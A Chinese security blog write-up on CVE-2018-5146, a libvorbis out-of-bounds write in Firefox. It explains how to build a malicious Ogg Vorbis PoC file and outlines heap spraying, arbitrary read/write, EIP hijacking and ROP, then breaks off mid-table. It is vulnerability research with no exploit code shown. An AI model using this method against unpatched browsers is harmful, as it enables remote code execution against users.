<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="“一个不像二进制同学的博客。”"><title>CVE-2018-5146 | f01965</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = 'https://hm.baidu.com/hm.js?' + 'true';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
  </script></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CVE-2018-5146</h1><a id="logo" href="/.">f01965</a><p class="description">初闻不知曲中意，再听已是曲中人。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CVE-2018-5146</h1><div class="post-meta">Apr 10, 2022<script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><a class="disqus-comment-count" href="/2022/04/10/CVE-2018-5146/#vcomment"><span class="valine-comment-count" data-xid="/2022/04/10/CVE-2018-5146/"></span><span> 条评论</span></a><div class="post-content"><p>这个文章是我刚开始学安全的时候第一个接触的漏洞，还是很有纪念意义的。文章之前发在了 freebuf 上，但是图不是很清晰。<br>这里补上所有部分，并给出 poc 以及 exp ：<a href="https://github.com/f01965/CVE-2018-5146" target="_blank" rel="noopener">https://github.com/f01965/CVE-2018-5146</a></p>
<!-- toc -->
<ul>
<li><a href="#一-概述">一． 概述</a></li>
<li><a href="#二-环境搭建">二． 环境搭建</a></li>
<li><a href="#三-漏洞函数的分析">三． 漏洞函数的分析</a><ul>
<li><a href="#31-a-数组">3.1 a 数组</a></li>
<li><a href="#32-t-数组">3.2 t 数组</a></li>
</ul>
</li>
<li><a href="#四-如何构造poc">四． 如何构造POC</a><ul>
<li><a href="#41-ogg">4.1 OGG</a></li>
<li><a href="#42-vorbis">4.2 Vorbis</a><ul>
<li><a href="#421-identification-header">4.2.1 Identification header</a></li>
<li><a href="#422-comments-header">4.2.2 Comments header</a></li>
<li><a href="#423-setup-header">4.2.3 Setup header</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#五-exploit">五． Exploit</a><ul>
<li><a href="#50-jemalloc">5.0 jemalloc</a></li>
<li><a href="#51-交错的数组">5.1 交错的数组</a></li>
<li><a href="#52-load-poc">5.2 load poc</a></li>
<li><a href="#53-寻找长长的array">5.3 寻找长长的array</a></li>
<li><a href="#54-另一个超长的数组">5.4 另一个超长的数组</a></li>
<li><a href="#55-arraybuffer-喷洒">5.5 Arraybuffer 喷洒</a></li>
<li><a href="#56-read-write">5.6 Read &amp; Write</a></li>
<li><a href="#57-jsobject">5.7 JSObject</a></li>
<li><a href="#58-eip-control">5.8 eip control</a></li>
<li><a href="#59-leak-xuldll-change-esp">5.9 leak xul.dll &amp; change esp</a></li>
<li><a href="#510-leak-kernel32-vritualproct">5.10 leak kernel32 &amp; VritualProct</a></li>
<li><a href="#511-shellcode">5.11 Shellcode</a></li>
</ul>
</li>
<li><a href="#六-pop-cmd">六． POP Cmd</a></li>
<li><a href="#七-final">七． Final</a></li>
</ul>
<!-- tocstop -->
<h3><span id="一-概述">一．     概述</span></h3><p>这是一个firefox的漏洞，位于 libvorbis 库中，在音频合成过程的深层次位置，想要触发它只能由具有residue 1 结构的音频文件。</p>
<p>Vorbis 是一种音频压缩格式，它的相关数据会被封装到一个OGG文件中； OGG 则是一种多媒体文件格式。</p>
<p>下图是用010 Editor 中的ogg.bt 模板读取出来的。可以看到这个ogg 文件有3个页。后面的分析，都将使用这个下图这个文件，姑且取名为 TestOgg；下面的分析过程都是建立在一个正常的ogg样本之上的，这里就是TestOgg。</p>
<p>  <img src="1.png" alt="">                             </p>
<p>（更详细的ogg vorbis格式将在下面介绍）</p>
<h3><span id="二-环境搭建">二．     环境搭建</span></h3><p>系统：Windows 7 32位</p>
<p>工具：Visual studio 2013，一个正常的ogg vorbis 音频文件，firefox 59.0，windbg。</p>
<p>因为需要使用到Ogg Vorbis 音频文件，而这个文件的格式又比较陌生。那么就需要一个能够帮助我们解析这个文件的工具。去官网发现有一些打包好的工程，和一些编译好的EXE文件。</p>
<p> <img src="2.png" alt=""></p>
<p>这个名叫 ogginfo .exe 的文件就可以静态解析Ogg Vorbis文件</p>
<p> <img src="3.png" alt=""></p>
<p>然后下载这些工程，在本地自行配置环境，编译一下ogginfo，成功之后就可以打断点进行调试一步一步分析了。</p>
<p> <img src="4.png" alt=""></p>
<p>当然，这个编译过程可能不会成功，会报错，想要解决也行，不过这里我直接写下我最后成功的操作：</p>
<ul>
<li><ol start="0">
<li><p>官网下载 libogg-1.3.3 ，libvorbis-1.3.5 ， 然后用 github上下载的 vorbis-tools-master 。因为从官网下载的这个 tools 工程有问题，而且没有解决掉。</p>
<p>链接：<a href="https://ftp.osuosl.org/pub/xiph/releases/vorbis/" target="_blank" rel="noopener">https://ftp.osuosl.org/pub/xiph/releases/vorbis/</a></p>
</li>
</ol>
</li>
<li><ol>
<li>把 libogg-1.3.3 的 include / ogg 文件夹 ，和 libvorbis-1.3.5 下 include / vorbis 文件夹放到tools 的include 下面。</li>
</ol>
</li>
<li><ol start="2">
<li><p>编译 libogg_static ，出现下面问题，如下解决一下就行。</p>
<p><img src="5.png" alt=""></p>
</li>
</ol>
</li>
<li><ol start="3">
<li>编译 vorbis_static ，先把 libogg-1.3.3 的 include / ogg 文件夹放到 include 下。</li>
</ol>
</li>
</ul>
<p>成功后得到libvorbis_static.lib ，改名为libvorbis.lib即可。<br>     <img src="6.png" alt=""></p>
<ul>
<li><ol start="4">
<li>然后打开 tools工程，把刚刚编译好的libogg_static.lib ，libvorbis.lib 的路径添加进去。<br><img src="7.png" alt=""></li>
</ol>
</li>
</ul>
<p>编译一下 ogginfo，成功。<br>     <img src="8.png" alt=""></p>
<ul>
<li><ol start="5">
<li>将 ogginfo 设置为 Startup Project，然后给它随便一个 ogg文件作为参数就可以进行调试，我使用的TestOgg只有3个ogg页。<br><img src="9.png" alt=""></li>
</ol>
</li>
<li><ol start="6">
<li>调试中比较关键的一个函数就是：oggpack_read<br><img src="10.png" alt=""></li>
</ol>
</li>
</ul>
<p>按F11跟进这个函数的时候就会提示你选择一个framing.c文件，选择如下这个src目录就行。<br> <img src="11.png" alt=""></p>
<p>那么在解析vorbis的时候关键的函数是：vorbis_synthesis_headerin<br> <img src="12.png" alt=""></p>
<p>这里会先解析pack的类型，然后按类型来一一解析其中的数据，下面构造poc的时候会详细说明这些结构。</p>
<p>到此静态分析的环境搭建完成了；下面的源码分析和调试都是在这个环境搭建完成的基础上进行的，但是主要目的是帮助构造 poc。</p>
<h3><span id="三-漏洞函数的分析">三．     漏洞函数的分析</span></h3><p>漏洞的具体位置在 vorbis_book_decodev_add() 这个函数中，在工程中的具体位置如下：</p>
<p> <img src="13.png" alt=""></p>
<p>源码如下：</p>
<p> <img src="14.png" alt=""></p>
<p>问题出在高亮部分那段for 循环。这个for 循环的条件是 j &lt; book-&gt;dim，里面的操作是把t数组赋给a 数组；而 a 数组的下标则是 i ，在上一个 for 循环可以看到 i &lt; n 。那么，这就存在当 book-&gt;dim 的值大于 n 时，t 数组对 a 数组的赋值就会超过 a 数组的正常范围。a 数组就在此时越界。</p>
<p>那么，a 数组是什么， t 数组又是什么？</p>
<p>从图上可以看到 a 数组是作为一个参数被传递进来的，而 t 数组是则是通过计算得来的。</p>
<h4><span id="31-a-数组">3.1  a 数组</span></h4><p>那么这里尝试寻找a 数组，看看是从哪里来。</p>
<p>在源码中搜索漏洞函数名字，找到如下的调用，这个叫 _01inverse 的函数是漏洞函数的上一层。</p>
<p> <img src="15.png" alt=""></p>
<p>那么继续寻找 _01inverse ，来到下面的位置：</p>
<p> <img src="16.png" alt=""></p>
<p>红框标出的地方，就是漏洞函数的在这一层定义的结构。需要注意的是，目前要关注的数据是 a 数组，反应在这里就是float * 这个位置的数据。在这个 _01inverse 的函数里，往下看可以发现下面这一段调用：</p>
<p> <img src="17.png" alt=""></p>
<p>float * 位置的数据传入的是 in[ j ] + offset ， offset 在上面计算了，那现在就是去找 in[ j ] 。 in [ ] 这个数组回头看 _01inverse 的函数头部：</p>
<p> <img src="18.png" alt=""></p>
<p>in[ ] 是在第三个参数的位置。那么再回到 res1_inverse :</p>
<p> <img src="19.png" alt=""></p>
<p>in[ ] 虽然在这里有赋值的过程，但不是我们要找的，这里的赋值也只是 in自己给自己的数据在赋值，没有实质上的变化，需要找到是 in[ ] 是从哪里来的。</p>
<p>接下来去找 res0_inverse ：</p>
<p> <img src="20.png" alt=""></p>
<p>residue1_exportbundle：</p>
<p> <img src="21.png" alt=""></p>
<p>这次去寻找  _residue_P 的时候，会找到多个位置。我们要找的是 _residue_P -&gt; inverse 这样的调用。所以来到如下的位置：</p>
<p>  <img src="22.png" alt=""></p>
<p>pcmbundle  参数就是 in[ ]，从代码里去搜索 pcmbundle  。</p>
<p> <img src="23.png" alt=""></p>
<p>pcmbundle 在这里被分配了空间，它就相当于是in[ ]； 但是这还没有完。</p>
<p>下面有另一处赋值：</p>
<p> <img src="24.png" alt=""></p>
<p>这里的 pcmbundle[ ] 相当于 in[ ] ，所以 in[ ] = vb-&gt;pcm[ ] 。继续去搜索 vb-&gt;pcm：</p>
<p>vb-&gt;pcm 也会搜索到很多地方，但是下图才是正确的位置。因为根据漏洞函数的触发流程可以知道 _mapping_P 是会被调用到的一层。</p>
<p> <img src="25.png" alt=""></p>
<p>vb-&gt;pcm[ ] 的大小由 vb-&gt;pcmend<em>sizeof(</em>vb-&gt;pcm[i]) 决定，vb-&gt;pcmend 的值由 ci-&gt;blocksizes[vb-&gt;W]，而 ci-&gt;blocksizes 的数据来自vorbis 的第一个头部 Identification header 中；</p>
<p>所以 a 数组的大小是可控的。 而分配内存的函数 _vorbis_block_alloc 实际上是 _ogg_malloc :</p>
<p>​    <img src="26.png" alt=""></p>
<p>回溯a[ ] 的过程，再进一步分析，也就搞清楚出了漏洞触发的过程，整理如下：</p>
<table>
<thead>
<tr>
<th><strong>vorbis_synthesis</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>_mapping_P[]</td>
</tr>
<tr>
<td>mapping0_exportbundle</td>
</tr>
<tr>
<td>mapping0_inverse</td>
</tr>
<tr>
<td>_residue_P[]</td>
</tr>
<tr>
<td>residue1_exportbundle</td>
</tr>
<tr>
<td>res1_inverse</td>
</tr>
<tr>
<td>vorbis_book_decodev_add</td>
</tr>
</tbody>
</table>
<h4><span id="32-t-数组">3.2 t 数组</span></h4><p>t [ ] 由 book-&gt;valuelist ， entry ，book-&gt;dim 的值计算得到。</p>
<p>由ZDI的公告可以知道 book-&gt;dim的值来自文件中某一位置的数据 。而book-&gt;valuelist ， entry 并不清楚。这里将不回溯去寻找t [ ]，只需要明白一点就是通过修改 book-&gt;dim 可以影响到 t[ ] 的数据，且触发的漏洞的一个条件是 book-&gt;dim &gt; 8。</p>
<h3><span id="四-如何构造poc">四．     如何构造POC</span></h3><p>在了解漏洞的具体情况之后，下面就该来分析ogg vorbis 的格式，构造能触发漏洞的音频文件了。去查看官方文档的说明，可以发现文件的格式不是按byte对齐的，如果不借助前面搭建的环境想要一步一步分析清楚是相当麻烦的一件事。</p>
<p>首先，对ogg 文件格式进行介绍。</p>
<h4><span id="41-ogg">4.1 OGG</span></h4><p>Ogg 是以页为单位的，每一个页都有如下的固定结构：</p>
<ol>
<li><p>Capture_pattern ：页标识，是ASCII字符，既：OggS ，4字节大小。</p>
</li>
<li><p>Stream_structure_version：版本ID，默认为0，1字节大小。</p>
</li>
<li><p>header_type_flag：当前页的类型 ，1字节大小。</p>
<p>可以是：</p>
<p>0x01：表示本页与前一页属于同一个逻辑比特流的同一个 Packet；若没有设置，则是一个新的 Packet。</p>
<p>0x02：表示本页是逻辑比特流的第一页bos；若没有设置则不是。</p>
<p>0x04：表示本页是逻辑比特流的最后一页eos；若没有设置则不是。</p>
</li>
<li><p>granule position：编码的相关参数，8字节大小，可以设置为全0。</p>
</li>
<li><p>serial number ： 当前页的流ID，4字节。</p>
</li>
<li><p>page sequence：页面序列号，用来判断页面有无丢失，4字节大小。</p>
</li>
<li><p>page checksum ：包含头部的页面校验和，4字节。</p>
</li>
<li><p>page_segments：segment_table中出现的个数，最大为255，1字节。</p>
</li>
<li><p>segmentLen：   记录每个segment_table长度的数组，它是一个数组，大小由segmen table的个数决定。假设只有一个 segment_table且长度为0x1E。那该位置就是1字节，且数据是 1E。</p>
</li>
<li><p>segment_table： 段表，存放数据的地方，大小在0-255字节。</p>
</li>
</ol>
<p><strong>需要注意一下的是：page checksum， 这个需要根据文件数据的改动而改，不然文件就是一个无法识别的错误文件。</strong></p>
<h4><span id="42-vorbis">4.2 Vorbis</span></h4><p>根据vorbis的标准可知，它有3个标识头，头部之后的所有数据包都是音频数据包。</p>
<p>标识头依次是：identification header，comments header，setup header。</p>
<p>这3个头部都还有一个公共的头：Common header ，结构如下：</p>
<p>1) [packet_type] : 包类型， 8字节大小;<br>    01 : 表示 identification header<br>    03 : 表示 comments header<br>    05 : 表示 setup header<br>2)  0x76, 0x6f, 0x72, 0x62, 0x69, 0x73: ASCII 字符，既：vorbis，6字节。</p>
<h5><span id="421-identification-header">4.2.1 Identification header</span></h5><p>官方的介绍如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1) [vorbis_version] = read 32 bits as unsigned integer</span><br><span class="line">2) [audio_channels] = read 8 bit integer as unsigned </span><br><span class="line">3) [audio_sample_rate] = read 32 bits as unsigned integer</span><br><span class="line">4) [bitrate_maximum] = read 32 bits as signed integer </span><br><span class="line">5) [bitrate_nominal] = read 32 bits as signed integer</span><br><span class="line">6) [bitrate_minimum] = read 32 bits as signed integer </span><br><span class="line">7) [blocksize_0] = 2 exponent (read 4 bits as unsigned integer)</span><br><span class="line">8) [blocksize_1] = 2 exponent (read 4 bits as unsigned integer) </span><br><span class="line">9) [framing_flag] = read one bit</span><br></pre></td></tr></table></figure></p>
<p>我用一个实例来对上面的参数进行说明，如下图：</p>
<p> <img src="27.png" alt=""></p>
<p>这里可以看到图上有2个OggS头的标识。</p>
<p>图中的蓝色部分：01 76 6F …. 00 B8 01 ；就是common header + identification header 的数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">packet_type    = 01</span><br><span class="line"></span><br><span class="line">76 6F 72 62 69 73 = vorbis </span><br><span class="line"></span><br><span class="line">vorbis_version   = 00 00 00 00</span><br><span class="line"></span><br><span class="line">audio_channels  = 02</span><br><span class="line"></span><br><span class="line">audio_sample_rate = 44 AC 00 00</span><br><span class="line"></span><br><span class="line">bitrate_maximum  = 00 00 00 00</span><br><span class="line"></span><br><span class="line">bitrate_nominal  = 70 11 01 00</span><br><span class="line"></span><br><span class="line">bitrate_minimum  = 00 00 00 00 </span><br><span class="line"></span><br><span class="line">blocksize[0–1]  = B8    </span><br><span class="line"></span><br><span class="line">framing_flag   = 01</span><br></pre></td></tr></table></figure></p>
<p>这之后就是下一个Ogg的页，这一页可以看到 <strong>packet_type = 03</strong> ，说明接着是 <strong>comments header</strong>。</p>
<h5><span id="422-comments-header">4.2.2 Comments header</span></h5><p>同样给出官方的说明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1) [vendor\_length] = read an unsigned integer of 32 bits</span><br><span class="line">2) [vendor\_string] = read a UTF-8 vector as [vendor\_length] octets </span><br><span class="line">3) [user\_comment\_list\_length] = read an unsigned integer of 32 bits</span><br><span class="line">4) iterate [user\_comment\_list\_length] times &#123; </span><br><span class="line">     [length] = read an unsigned integer of 32 bits</span><br><span class="line">     this iteration’s user comment = read a UTF-8 vector as [length] octets </span><br><span class="line">   &#125;</span><br><span class="line">5) [framing\_bit] = read a single bit as Boolean</span><br><span class="line"></span><br><span class="line">6) if ( [framing\_bit] unset or end-of-packet ) then ERROR</span><br><span class="line"></span><br><span class="line">7) done.</span><br></pre></td></tr></table></figure></p>
<p>继续用上面的例子来说明：</p>
<p> <img src="28.png" alt=""></p>
<p>这已经是Ogg第二个页了，这里可以看到 <strong>SegmentLen</strong> 的长度是14，说明它的大小就是 14字节。</p>
<p>蓝色的部分就是 <strong>common header + comments header</strong> ：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1、packet_type    = 03</span><br><span class="line"></span><br><span class="line">2、76 6F 72 62 69 73 = vorbis </span><br><span class="line"></span><br><span class="line">3、vendor\_length  = 1D 00 00 00 表示下面的字符串长度：0x1D = 29 字节</span><br><span class="line"></span><br><span class="line">4、vendor\_string  = 00 58 69 70 … 30 36 32 32 共29字节，表示制作软件信息的字符串。</span><br><span class="line"></span><br><span class="line">5、user\_comment\_list\_length = 02 00 00 00 表示用户注释字符串的个数为 2 ，也就是下面讲有2个字符串。</span><br><span class="line"></span><br><span class="line">  [user length ]= 2B 00 00 00 表示第一个用户注释字符串长度是 0x2B = 43。</span><br><span class="line"></span><br><span class="line">  user comment ：3D 43 6F 70 … 6A 65 63 74 这一段就是第一个用户注释了。特别的：3D 对应”=” ,这个等号用于终止字段名；这里没有字段名。</span><br><span class="line"></span><br><span class="line">  [user length ]= 14 00 00 00 表示第二个用户注释字符串长度是 0x14 = 20。</span><br><span class="line"></span><br><span class="line">  user comment ：74 69 74 6C … 74 74 65 72 第二个用户注释；同理，这里的字段名是 “title”;</span><br><span class="line"></span><br><span class="line">6、framing\_bit   = 01  1字节的Boolean类型数据； 若没有设置则会出错。</span><br></pre></td></tr></table></figure></p>
<p>到这里 <strong>Comments header</strong> 就结束了。但是接下来数据可以看到是 05 ，说明紧接着就是 <strong>setup header</strong> 的结构。</p>
<h5><span id="423-setup-header">4.2.3 Setup header</span></h5><p>这个结构是最关键的部分，也是构造的难点所在。ZDI上所说的 type 1 residue encoding 结构就包含在这里。</p>
<p> <img src="29.png" alt=""></p>
<p>这段数据比较复杂，就不能一位一位来进行说明，先给出这个部分的整体结构：</p>
<table>
<thead>
<tr>
<th><strong>05 76 6F 72 62 69 73</strong></th>
<th><strong>05</strong> <strong>包类型，</strong> <strong>“v o r b i s ”</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>codebooks 数量</td>
<td>codebooks[ ] 结构</td>
</tr>
<tr>
<td>time backend 数量</td>
<td>time backend[ ] 结构</td>
</tr>
<tr>
<td>floor backend数量</td>
<td>floor backend[ ] 结构</td>
</tr>
<tr>
<td>residue backend数量</td>
<td>residue backend[ ] 结构</td>
</tr>
<tr>
<td>map backend数量</td>
<td>map backend[ ] 结构</td>
</tr>
<tr>
<td>mode settings数量</td>
<td>mode settings[ ] 结构</td>
</tr>
</tbody>
</table>
<p>下面将根据我们搭建的ogginfo 项目来分析Setup header，同时会对照图中的数据一步一步说明 。<br>1、将断点打在 _vorbis_unpack_books，项目中解析的源代码如下图：</p>
<p> <img src="30.png" alt=""></p>
<p>这里的截图由于函数过长不能完全显示出来，下面还剩下一个 mode settings的结构。</p>
<p>2、打好断点，开始调试。</p>
<p> <img src="31.png" alt=""></p>
<p>从图中可以看到程序走到了这个位置，且前面提到的 blocksizes[ ] 已经被计算出来了，注意这个值是可以影响a[ ] 大小的。至于 blocksizes[ ] 的值可以在第一个 vorbis 头的解析函数中去查看是如何计算的，如下图：</p>
<p> <img src="32.png" alt=""></p>
<p>接着回到刚刚断点的位置：</p>
<p> <img src="33.png" alt=""></p>
<p>F11跟进 oggpack_read 函数：</p>
<p> <img src="34.png" alt=""></p>
<p>在内存中查看对应的位置 0x00140E83 ，这里的数据就是 Setup header 除去 vorbis 头部的后的部分了；注意红框的 bits ，这个参数决定了这里的数据从0x00140E83 的位置读取多少位；图中 bits = 8 ，说明读取1个字节，那么读取的数据就是 0x00140E83 的第一个字节 ： 0x22。</p>
<font color="red">（前面提到这个 oggpack_read 函数很重要的原因就是ogg文件的读取不是按字节对齐的；它存在跨字节读取数据，这就使得分析起来比较复杂，所以我才搭建这个project来帮助分析。）</font>

<p>然后下面进行计算，具体计算可自行分析，不再过多介绍。</p>
<p>最终得到的：<strong>books = 34 + 1 = 35</strong> :<br><img src="35.png" alt=""><br>最后有个加一，所以cooks的值不可能设置为0。也就意味着可以把 0x22 改写为 0x00 。</p>
<p>为什么要改写为 0 ？</p>
<p>因为我的目的是构造poc，那么这些结构的数量在保证正确的情况下，数量更小，方便对数据进行组织，出错也更容易修改，且构造出的poc 文件更小。</p>
<p>然后跟进 <strong>vorbis_staticbook_unpack</strong> 函数：</p>
<p> <img src="36.png" alt=""></p>
<p>这里就可以看到s-&gt;dim和s-&gt;entries的值是从文件什么地方读取的，<strong>dim 值就是 book-&gt;dim，但是这个 entries 不是 t[ ] 中的 entry</strong>。</p>
<p>这里为了更好的说明，在windbg下调试最终构造出的poc可以看到：</p>
<p> <img src="37.png" alt=""></p>
<p>此时运行到 <strong>imul edx, eax</strong> </p>
<p>在我构造的文件中<strong>dim = 0x48， entries = 8</strong>。</p>
<p>这里 eax = 48存放的就是 dim 值，edx = 0 是 entry的值。</p>
<p>3、 residue 结构</p>
<p>上面说过，漏洞文件出在type 1 residue encoding ，那我们略过中间的 time ，floor结构的构造部分，这里我略过不代表不去构造，而是限于篇幅不再细细分析。</p>
<p>直接来到解析 residue 结构的位置：</p>
<p> <img src="38.png" alt=""></p>
<p>这里有个 residue_type 的类型判断，所以构造的时候必须是 “1”类型；后面可以跟进res0_unpack ，这里面就是解析 residue的具体结构了。</p>
<p>  <img src="39.png" alt=""></p>
<p>同理，下面的结构也就不再分析。</p>
<p>到此，对于POC如何构造就结束了。最后提示几点：</p>
<p>(1)、构造poc 之前，我用了一个只有3个ogg页的正常的ogg文件来作为基础进行改动。</p>
<p>(2)、需要改动的部分实际上全在ogg第二页。</p>
<p>(3)、改动数据之后要记得修改<strong>checksum</strong>的值，这个checksum值不是常规的crc32计算出来的，但是我找到了它的crc32计算的源码，和编译好的exe程序。</p>
<p>(4)、在构造setup_header时，codebooks ,time ,floor…等这些结构不一定是相邻的。比如：codebooks结构之后是：一部分其他数据 + t[ ] 的数据，t[ ]数据之后才是 time ,floor的结构。</p>
<p>(5)、在上面静态分析中，我们不可能走到漏洞函数的位置去，也就是说是无法调试漏洞函数。因为漏洞的触发是在音频合成的过程中，这是个动态的过程，上面只是静态的分析数据，也就是判断文件是不是一个正常的ogg vorbis文件而已。</p>
<p>我在构造的时候，修改了无数遍文件，花了相当多的时间：</p>
<p> <img src="40.png" alt=""></p>
<p>尝试了大概500+的次数。虽然这样做十分的花时间，这也是一个比较笨的办法。不过好处就是清清楚楚的知道漏洞的中每个参数从文件中的什么位置去取得的，进行了怎么样的计算，改动什么位置的数据可以达到想要的目的。最终的构造出的poc也很小。</p>
<p> <img src="41.png" alt=""></p>
<h3><span id="五-exploit">五．     Exploit</span></h3><p>Poc 有了之后，我们能用这个poc做什么呢？</p>
<p>再回头看看漏洞成因，由于 a[ ]本身的数据在堆上，且 a[ ] 中的数据由 t[ ] 来 ，t[ ] 数据从文件中的某一段位置获取，具体位置可以从windbg调试知道；a[ ] 又越界了，意味着a[ ]在堆上可以修改到其他内存的数据。</p>
<p>那么整体的思路：</p>
<p>①  喷洒array ，通过 a[ ]的数据溢出修改到某一个 array 的长度，从而获得一个超长且可读写的数组。</p>
<p>②  喷洒arraybuffer ，让超长的array 去修改 arraybuffer 的长度，数据指针等，获得一个超长的arraybuffer ；用Dataview类型的对象初始化这个arraybuffer，从而获得任意地址读写的目的。</p>
<p>③  在任意地址读写的前提下，创建js对象，泄露对象的指针，构造假的对象，然后调用对象的属性，从而劫持eip ；最后就是构造rop链。</p>
<p>这只是 一个大概的流程，具体的操作下面介绍。</p>
<h4><span id="50-jemalloc">5.0 jemalloc</span></h4><p>关于firefox堆的机制，具体请参考：</p>
<p><a href="http://blogs.360.cn/blog/how-to-kill-a-firefox/" target="_blank" rel="noopener">http://blogs.360.cn/blog/how-to-kill-a-firefox/</a></p>
<p><a href="https://media.blackhat.com/bh-us-12/Briefings/Argyoudis/BH_US_12_Argyroudis_Exploiting_the_ jemalloc_Memory_ Allocator_WP.pdf" target="_blank" rel="noopener">Exploiting the jemalloc Memory Allocator: Owning Firefox’s Heap</a></p>
<p>这2篇文章中对这块讲的非常容易理解。</p>
<p>另外一点：在firefox堆上，如果一个dword存放某个数据，那么dword+4存放的就是这个数据的类型标识符。</p>
<table>
<thead>
<tr>
<th><strong>dword</strong></th>
<th><strong>dword+4</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>对象</td>
<td>0xffffff8C</td>
</tr>
<tr>
<td>字符串</td>
<td>0xffffff86</td>
</tr>
<tr>
<td>数值</td>
<td>0xffffff81</td>
</tr>
<tr>
<td>boolean</td>
<td>0xffffff83</td>
</tr>
</tbody>
</table>
<h4><span id="51-交错的数组">5.1 交错的数组</span></h4><p> 首先，我们在堆上申请大量的 Array ，这个量到底多大合适，根据我后面的分析我定为了0x700。</p>
<p>注意：Array 在内存中存放的情况如下：</p>
<table>
<thead>
<tr>
<th><strong>Length1</strong></th>
<th><strong>Length2</strong></th>
<th><strong>Length3</strong></th>
<th><strong>数据</strong></th>
<th><strong>类型</strong></th>
<th><strong>数据</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>前面3个dword 是存放的数组长度，正常情况下这3个length 是相等的。根据分析可知：</p>
<p>Length3被修改之后，Array 的长度就被修改为Length3，即使这个3个length 互不相同。</p>
<p>之后，交错释放掉Array；这一步的目的是在这些大量的Array数组中，释放掉一部分，形成空的内存位置：</p>
<table>
<thead>
<tr>
<th><strong>Array</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>空</strong></td>
</tr>
<tr>
<td><strong>Array</strong></td>
</tr>
<tr>
<td><strong>空</strong></td>
</tr>
<tr>
<td><strong>Array</strong></td>
</tr>
<tr>
<td><strong>……</strong></td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>每个Array的长度为多少也是很关键的一部分。因为，我们释放出来的空的部分，是为了让 a[ ] 被分配到这些空的内存区间去。前面说过，a[ ]的数据是在堆上的。</p>
<p>当 Array 的大小与 a[ ] 的大小差不都的时候，释放掉的空的位置，就有可能让a[ ] 分配上去；那么a[ ]有多大，这就要根据自己的poc来决定了（blocksize[ ] 的数据），分析之后我定义Array的长度为 0x3e，且刚好可以修改到相邻的Array 的length3这一位置。</p>
<p>当然，由于内存中可能存在其他对象的分配释放，为了使出现图上的情况更加稳定一些，在交错释放之后，又可以再进行一次新的Array 的申请与交错释放，这一次的Array的大小可以不用那么大，取值0x100。</p>
<p>另外再提一点，在ZDI的公共上提到的是 array 与 arraybuffer交错的去喷洒堆。这里就存在一个问题，arraybuffer 的结构如何在内存中存放的？</p>
<p>如下：</p>
<p>arraybuffer长度比较大的时候，arraybuffer 结构与数据是分开在内存中存放的：</p>
<table>
<thead>
<tr>
<th><strong>地址</strong></th>
<th><strong>0x06e5 0340</strong></th>
<th><strong>Arraybuffer</strong> <strong>头部结构</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>……</td>
<td></td>
</tr>
<tr>
